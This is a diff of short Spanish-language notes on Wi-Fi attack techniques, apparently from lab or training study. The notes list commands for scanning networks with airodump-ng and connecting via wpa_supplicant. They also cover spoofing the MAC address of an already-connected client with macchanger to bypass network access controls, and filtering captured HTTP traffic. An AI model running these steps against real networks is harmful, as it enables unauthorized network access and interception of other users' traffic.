@@ -12,7 +12,7 @@ Linssid (cambiar canales de los wifi para que no coincidan)
         key_mgmt=NONE
         scan_ssid=1
 	 }
-- wpa_supplicant -Dnl80211 -iwlan1 -c free.conf 
+- wpa_supplicant -Dnl80211 -i wlan1 -c free.conf 
 - dhclient wlan1 -v (en otra terminal)
 - airodump-ng wlan0mon -w ./scan6 --manufacturer --wps -c6
 - creamos open.conf y ponemos:
@@ -21,13 +21,15 @@ Linssid (cambiar canales de los wifi para que no coincidan)
         key_mgmt=NONE
         scan_ssid=1
 	 }
-- wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
+- wpa_supplicant -Dnl80211 -i wlan2 -c open.conf
 - dhclient wlan2 -v (en otra terminal)
-- airodump-ng wlan0mon -w ../wifi/scan6 --manufacturer --wps -c6
+- airodump-ng wlan0mon -w ./wifi/scan6 --manufacturer --wps -c6
 - ip link set wlan2 down
-- macchanger -m B0:72:BF:44:B0:49  wlan2
+- macchanger -m B0:72:BF:44:B0:49  wlan2 (cogemos la MAC de alguno conectado al wifi)
 - ip link set wlan2 up
-- 
+- wpa_supplicant -Dnl80211 -i wlan2 -c open.conf
+- dhclient wlan2 -v (en otra terminal)
+- http && ip.dst
 ## WPS
 
 
